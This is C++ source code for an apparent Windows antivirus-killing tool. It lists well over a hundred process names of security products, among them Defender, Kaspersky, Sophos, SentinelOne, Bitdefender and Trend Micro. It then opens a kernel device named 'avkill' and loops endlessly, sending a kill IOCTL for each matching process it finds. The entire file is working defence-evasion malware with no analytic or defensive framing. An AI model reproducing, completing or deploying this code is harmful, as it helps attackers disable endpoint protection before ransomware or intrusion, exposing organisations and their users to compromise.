#define _CRT_SECURE_NO_WARNINGS
#define IOCTL_KILL	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0001, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>
#include "encrypt.h"

struct InputData {
    ULONG pid;
};
struct InputDataString {
    WCHAR path;
};

DWORD FindProcessId(const char* procname) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
    pe.dwSize = sizeof(PROCESSENTRY32);
    hResult = Process32First(hSnapshot, &pe);
    while (hResult) {
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[])
{
    char AVList[][100] = {
        "AgentSvc.exe",
        "PSUAMain.exe",
        "PSANHost.exe",
        "PSUAService.exe",
        "active_protection_service.exe",
/* Kaspersky start */
        "SonicWallClientProtectionService.exe",
        "klserver.exe",
        "kavfsscs.exe",
        "kavfs.exe",
        "kavtray.exe",
        "kavfswp.exe",
        "ebloader.exe",
        "klactprx.exe",
        "SrvLauncher.exe",
        "klnagent.exe",
        "klcsweb.exe",
        "soyuz.exe",
        "kavfswh.exe",
        "avp.exe",
        "avpsus.exe",
        "avpui.exe",
        "ksde.exe",
        "ksdeui.exe",
/* Kaspersky end */
/* Norton Security end*/
/* Defendef */
        "MsMpEng.exe",
        "MSASCui.exe",
        "MSASCuiL.exe",
/* Defendef end */
/* Malwarebytes start*/
        "MBAMService.exe",
/* Malwarebytes end*/
/* Symantec start*/
        "Smc.exe",
        "ccSvcHst.exe",
        "SmcGui.exe",
/* Symantec end */
/* Bitdefender start */
        "bdservicehost.exe",
        "EPProtectedService.exe",
        "EPIntegrationService.exe",
        "EPSecurityService.exe",
        "EPUpdateService.exe",
        "bdredline.exe",
        "epconsole.exe",
        "BDFsTray.exe",
        "BDFileServer.exe",
        "bdemsrv.exe",
        "BDAvScanner.exe",
        "Arrakis3.exe",
        "bdlived2.exe",
        "BDLogger.exe",
        "bdlserv.exe",
        "bdregsvr2.exe",
        "BDScheduler.exe",
        "BDStatistics.exe",
        "npemclient3.exe",
        "ephost.exe",
/* Bitdefender end */
/* Sophos start */
        "hmpalert.exe",
        "ALsvc.exe",
        "McsAgent.exe",
        "McsClient.exe",
        "SEDService.exe",
        "Sophos UI.exe",
        "SophosUI.exe",
        "SophosFileScanner.exe",
        "SophosFS.exe",
        "SophosFIMService.exe",
        "SophosHealth.exe",
        "SLDService.exe",
        "VipreAAPSvc.exe",
        "VipreNis.exe",
        "SBAMSvc.exe",
        "SBAMTray.exe",
        "SBPIMSvc.exe",
/* ThreatLocker start */
        "threatlockerservice.exe",
        "threatlockertray.exe",
        "ThreatLockerConsent.exe",
        "Healthservice.exe",
/* ThreatLocker end */
/* SentinelOne */
        "SentinelUI.exe",
        "SentinelAgent.exe",
        "SentinelAgentWorker.exe",
        "SentinelHelperService.exe",
        "SentinelServiceHost.exe",
        "SentinelStaticEngine.exe",
        "SentinelStaticEngineScanner.exe",
/* SentinelOne end*/
        "SophosADSyncService.exe",
        "swi_fc.exe",
        "swi_filter.exe",
        "SophosLiveQueryService.exe",
        "SophosMTR.exe",
        "SophosMTRExtension.exe",
        "SophosNetFilter.exe",
        "SophosNtpService.exe",
        "SophosOsquery.exe",
        "SophosOsqueryExtension.exe",
        "SSPService.exe",
        "SavService.exe",
        "swi_service.exe",
        "SSPService.exe",
        "SophosSafestore64.exe",
        "SophosCleanM64.exe",
        "swc_service.exe",
        "SAVAdminService.exe",
        "sdcservice.exe",
        "SavApi.exe",
/* OLD Sophos */
        "ManagementAgentNT.exe",
        "CertificationManagerServiceNT.exe",
        "ALMon.exe",
        "MgntSvc.exe",
        "RouterNT.exe",
        "SophosUpdateMgr.exe",
        "SUMService.exe",
        "Sophos.PolicyEvaluation.Service.exe",
/* Sophos end */
        "msseces.exe",
/* NOD32 start */
        "ekrn.exe",
        "egui.exe",
        "EraAgentSvc.exe",
        "eguiProxy.exe",
/* NOD32 end */
/* Trend Micro */
        "PccNt.exe",
        "TmCCSF.exe",
        "svcGenericHost.exe",
        "TMBMSRV.exe",
        "iCRCService.exe",
        "tmicAgentSetting.exe",
        "OfcService.exe",
        "DbServer.exe",
        "NTRTScan.exe",
        "CNTAoSMgr.exe",
        "SRService.exe",
        "LWCSService.exe",
        "DbServer.exe",
        "ofcDdaSvr.exe",
        "PccNTMon.exe",
        "TmListen.exe",
        "iVPAgent.exe",
        "TmPfw.exe",
        "ESClient.exe",
        "TmSSClient.exe",
        "TmsaInstance64.exe",
        "ESEServiceShell.exe",
        "ESEFrameworkHost.exe",
/* Trend Micro end */
        "AvastSvc.exe",
        "AvastUI.exe",
        "aswToolsSvc.exe",
        "aswEngSrv.exe",
        "aswidsagent.exe",

/* VIPRE Advanced Ac*/

    };
    DWORD retn;
    InputData buffer;
    HANDLE handle = CreateFileA("\\\\.\\avkill", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    while (true) {
        for (int i = 0; i < (sizeof(AVList)/100); i++)
        {
            DWORD pid = FindProcessId(AVList[i]);
            if (pid != 0) {
                buffer.pid = pid;
                printf("[+] Found %s with PID: %d -- OK!\n", AVList[i], pid);
                printf("[+] Trying to delete it...\n");
                DeviceIoControl(handle, IOCTL_KILL, &buffer, sizeof(buffer), nullptr, 0, &retn, nullptr);
            }
        }
    }
}
